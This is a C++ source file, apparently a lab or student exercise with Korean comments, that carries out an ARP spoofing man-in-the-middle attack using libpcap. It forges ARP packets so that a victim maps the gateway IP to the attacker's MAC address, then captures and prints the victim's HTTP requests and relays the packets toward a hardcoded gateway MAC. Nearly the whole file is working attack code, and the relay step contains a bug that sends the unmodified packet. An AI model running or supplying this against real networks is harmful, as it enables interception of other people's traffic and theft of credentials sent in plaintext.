#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <netinet/ether.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <string>
#include <iostream>
#include "libnet1.h"
#include <netinet/ip.h>
#include <stdint.h>

using namespace std;
#pragma pack(push, 1)
struct EthArpPacket final {
   EthHdr eth_;
   ArpHdr arp_;
};
#pragma pack(pop)
bool is_http_request(const char *data);
void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
char* get_mac_address();
char* victim_address(char* interface);
void usage() {
   printf("syntax: arp-test <interface> <victim ip> <gateway ip>\n");
   printf("sample: send-arp-test wlan0\n");
}
pcap_t* handle;

int main(int argc, char* argv[]) {
   if (argc != 4) {
      usage();
      return -1;
   }

   char* dev = argv[1];   //<interface>
   char* victim_ip = argv[2];   //<victim ip>
   char* gateway_ip = argv[3];   //<gateway ip>


   char errbuf[PCAP_ERRBUF_SIZE];
   handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
   if (handle == nullptr) {
      fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
      return -1;
   }


	//to make normal arp request packet address
   EthArpPacket packet;

   char Attacker_Mac[100] = {0,};   //src_mac

   strcpy(Attacker_Mac,get_mac_address());
   printf("Attacker mac : ");
	puts(Attacker_Mac);

   // victim mac 
   packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF"); // victim MAC
   packet.eth_.smac_ = Mac(Attacker_Mac); // hacker MAC
   packet.eth_.type_ = htons(EthHdr::Arp);

   packet.arp_.hrd_ = htons(ArpHdr::ETHER);
   packet.arp_.pro_ = htons(EthHdr::Ip4);
   packet.arp_.hln_ = Mac::SIZE;
   packet.arp_.pln_ = Ip::SIZE;
   packet.arp_.op_ = htons(ArpHdr::Request);
   packet.arp_.smac_ = Mac(Attacker_Mac);   // hacker MAC
   packet.arp_.sip_ = htonl(Ip(gateway_ip));   // gateway ip
   packet.arp_.tmac_ = Mac("FF:FF:FF:FF:FF:FF");   // victim MAC
   packet.arp_.tip_ = htonl(Ip(victim_ip));   // victim ip


   // const u_char* packet_data;
	char target_mac[20] = {0,};//target_mac
	struct ip* iph;
	struct libnet_ethernet_hdr* mac;

   //EthHdr -> type()
   struct EthHdr *t;

   printf("#################\n");
   printf("Infecting Victim\n");

   while(true){
      int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
      if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
     }
      struct pcap_pkthdr* header;

      const u_char* packet;//packet_data

      res = pcap_next_ex(handle, &header, &packet);

      if (res == 0) continue;

      if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {

         printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));

         break;

      }
      
      // printf("ARP test\n");
      t = (EthHdr*)packet;      
      // printf("%x\n",t->type_); //packet type 16
      // printf("%d\n",t->type_); //packet type 10
      if(t->type_ == 1544){
         printf("I got arp packet!\n");
         printf("#################\n");
         printf("Destination Mac : ");

         mac = (libnet_ethernet_hdr*)packet;// packet -> ethernet hdr
         int i;
         char buf[10];
         memset(target_mac,0,20);//memory set
         for(i=0;i<6;i++){
            sprintf(buf,"%02x:",mac->ether_shost[i]);
            strcat(target_mac,buf);
         }
         target_mac[17]='\0';
         puts(target_mac);

         printf("Ip : ");

         iph = (struct ip*)(packet+sizeof(struct libnet_ethernet_hdr) + 2);
         printf("%s\n",inet_ntoa(iph->ip_src));
         printf("%s\n",target_mac);
         if(strcmp(inet_ntoa(iph->ip_src),argv[2]) == 0)
         {
            break;
         }

         // break; // broadcast
      }
	   
   }

   printf("I Found victim's mac!\n");
   // 라우터 mac주소 = 00:50:56:eb:11:13


   printf("#################\n");
   printf("Start Attack!\n");


   //victim attack
   packet.eth_.dmac_ = Mac(target_mac); // victim MAC
   packet.eth_.smac_ = Mac(Attacker_Mac); // hacker MAC
   packet.eth_.type_ = htons(EthHdr::Arp);

   packet.arp_.hrd_ = htons(ArpHdr::ETHER);
   packet.arp_.pro_ = htons(EthHdr::Ip4);
   packet.arp_.hln_ = Mac::SIZE;
   packet.arp_.pln_ = Ip::SIZE;
   packet.arp_.op_ = htons(ArpHdr::Request);
   packet.arp_.smac_ = Mac(Attacker_Mac);   // hacker MAC
   packet.arp_.sip_ = htonl(Ip(gateway_ip));   // gateway ip
   packet.arp_.tmac_ = Mac(target_mac);   // victim MAC
   packet.arp_.tip_ = htonl(Ip(victim_ip));   // victim ip

   int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
   if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
   }else{
      printf("attack success!\n");
   }
   
   // struct bpf_program fp; // 필터 프로그램
   // char filter_exp[] = "tcp port 80"; // HTTP 요청 필터
   // // 필터 컴파일
   // if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
   //    fprintf(stderr, "Could not parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
   //    return 1;
   // }

   // // 필터 설정
   // if (pcap_setfilter(handle, &fp) == -1) {
   //    fprintf(stderr, "Could not install filter %s: %s\n", filter_exp, pcap_geterr(handle));
   //    return 1;
   // }

   //victim -> attacker 
   pcap_loop(handle, 0, packet_handler, reinterpret_cast<u_char*>(handle));

   pcap_close(handle);
}

char* get_mac_address(){//get attacker mac address
    int socket_fd; 
    int count_if; 
    struct ifreq *t_if_req; 
    struct ifconf t_if_conf; 
    static char arr_mac_addr[17] = {0x00, }; 
    memset(&t_if_conf, 0, sizeof(t_if_conf)); 
    t_if_conf.ifc_ifcu.ifcu_req = NULL; 
    t_if_conf.ifc_len = 0; 
    if( (socket_fd = socket(PF_INET, SOCK_DGRAM, 0)) < 0 ) {
         
    } 
    if( ioctl(socket_fd, SIOCGIFCONF, &t_if_conf) < 0 ) { 
         
    } 
    if( (t_if_req = (ifreq *)malloc(t_if_conf.ifc_len)) == NULL ) {
        close(socket_fd); 
        free(t_if_req); 
    } 
    else { 
        t_if_conf.ifc_ifcu.ifcu_req = t_if_req; 
        if( ioctl(socket_fd, SIOCGIFCONF, &t_if_conf) < 0 ) {
            close(socket_fd); 
            free(t_if_req); 
        } 
        count_if = t_if_conf.ifc_len / sizeof(struct ifreq);
        for( int idx = 0; idx < count_if; idx++ ) { 
            struct ifreq *req = &t_if_req[idx]; 
            if( !strcmp(req->ifr_name, "lo") ) {
                continue; 
            } 
            if( ioctl(socket_fd, SIOCGIFHWADDR, req) < 0 ) { 
                break; 
            } 
            sprintf(arr_mac_addr, "%02x:%02x:%02x:%02x:%02x:%02x", (unsigned char)req->ifr_hwaddr.sa_data[0], (unsigned char)req->ifr_hwaddr.sa_data[1], (unsigned char)req->ifr_hwaddr.sa_data[2], (unsigned char)req->ifr_hwaddr.sa_data[3], (unsigned char)req->ifr_hwaddr.sa_data[4], (unsigned char)req->ifr_hwaddr.sa_data[5]); 
            break;
        } 
    } 
    close(socket_fd); 
    free(t_if_req);

    return arr_mac_addr;
}

void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
   // Ethernet 헤더 크기 (14바이트)
   const u_char *ip_header = packet + 14; // Ethernet 헤더 이후

   // IP 헤더 길이 계산 (첫 번째 바이트의 하위 4비트를 4배로)
   int ip_header_length = (ip_header[0] & 0x0F) * 4; // IP 헤더 길이

   // TCP 헤더로 이동
   const u_char *tcp_header = ip_header + ip_header_length; // IP 헤더 이후

   // TCP 헤더 길이 계산 (TCP 헤더의 첫 번째 바이트의 하위 4비트를 4배로)
   int tcp_header_length = (tcp_header[12] >> 4) * 4; // TCP 헤더 길이

   // TCP 데이터 시작
   const u_char *tcp_data = tcp_header + tcp_header_length; // TCP 데이터 시작
   int tcp_data_length = header->len - (14 + ip_header_length + tcp_header_length); // TCP 데이터 길이
   // HTTP 요청을 출력합니다.
   if (tcp_data_length > 0 && is_http_request((const char *)tcp_data)) {
      printf("Captured HTTP Request:\n");
      for (int i = 0; i < tcp_data_length; i++) {
          // ASCII 범위 내의 문자만 출력
          if (tcp_data[i] >= 32 && tcp_data[i] < 127) {
              putchar(tcp_data[i]);
          } else {
              putchar('.'); // 비ASCII 문자는 '.'로 대체
          }
      }
      printf("\n");
   }

   

   // 라우터 R에게 패킷 전달 (여기서는 단순히 패킷을 재전송)
   // 실제로는 C의 MAC 주소로 변경하고 라우터의 MAC 주소 설정 필요
   // libnet을 사용하여 패킷 생성 및 전송
   // 예시로 간단히 패킷을 전송합니다.
   
   // 패킷을 게이트웨이로 전달
   uint8_t *new_packet = (uint8_t *)malloc(header->len); // 새로운 패킷을 위한 메모리 할당
   if (!new_packet) {
       perror("malloc");
       return;
   }
   // 패킷 복사
   memcpy(new_packet, packet, header->len);

   // 목적지 MAC 주소를 게이트웨이의 MAC 주소로 변경
   uint8_t gateway_mac[ETHER_ADDR_LEN] = {0x00, 0x50, 0x56, 0xeb, 0x11, 0x13};
   memcpy(new_packet, gateway_mac, ETHER_ADDR_LEN); // 새로운 목적지 MAC 주소 설정

   // 패킷 전송 로직 (예: 소켓을 통해)
   // 여기에 패킷 전송 로직을 추가합니다.
   int res = pcap_sendpacket(handle, packet, header->len);
   if (res != 0) {
      fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
   }else{
      // printf("Gateway로 전송완료\n");
   }
   


   free(new_packet); // 동적으로 할당한 메모리 해제
}

// HTTP 메서드 확인 함수
bool is_http_request(const char *data) {
   return (strncmp(data, "GET ", 4) == 0 ||
           strncmp(data, "POST ", 5) == 0 ||
           strncmp(data, "PUT ", 4) == 0 ||
           strncmp(data, "DELETE ", 7) == 0 ||
           strncmp(data, "HEAD ", 5) == 0 ||
           strncmp(data, "OPTIONS ", 8) == 0 ||
           strncmp(data, "PATCH ", 6) == 0);
}
